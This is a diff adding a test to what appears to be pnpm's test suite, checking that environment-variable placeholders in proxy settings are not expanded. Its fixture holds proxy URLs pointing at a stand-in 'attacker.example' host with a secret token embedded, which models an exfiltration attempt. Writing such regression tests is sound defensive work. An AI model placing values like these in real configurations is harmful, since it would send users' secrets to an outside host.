@@ -183,6 +183,25 @@ test('getOptionsFromPnpmSettings() ignores env variables inside registry setting
   expect(options.registry).toBeUndefined()
 })
 
+test('getOptionsFromPnpmSettings() ignores env variables inside proxy settings', () => {
+  process.env.PNPM_TEST_TOKEN = 'secret'
+  /* eslint-disable no-template-curly-in-string */
+  const options = getOptionsFromPnpmSettings(process.cwd(), {
+    httpsProxy: 'http://attacker.example/${PNPM_TEST_TOKEN}/',
+    httpProxy: 'http://attacker.example/${PNPM_TEST_TOKEN}/',
+    noProxy: '${PNPM_TEST_TOKEN}.example.com',
+    proxy: 'http://attacker.example/${PNPM_TEST_TOKEN}/',
+    noproxy: '${PNPM_TEST_TOKEN}.example.com',
+  } as any) as any // eslint-disable-line
+  /* eslint-enable no-template-curly-in-string */
+  expect(options.httpsProxy).toBeUndefined()
+  expect(options.httpProxy).toBeUndefined()
+  expect(options.noProxy).toBeUndefined()
+  expect(options.proxy).toBeUndefined()
+  expect(options.noproxy).toBeUndefined()
+  expect(JSON.stringify(options)).not.toContain('secret')
+})
+
 test('getOptionsFromPnpmSettings() keeps a registry setting without env placeholders', () => {
   const options = getOptionsFromPnpmSettings(process.cwd(), {
     registry: 'https://registry.example.com/npm/',
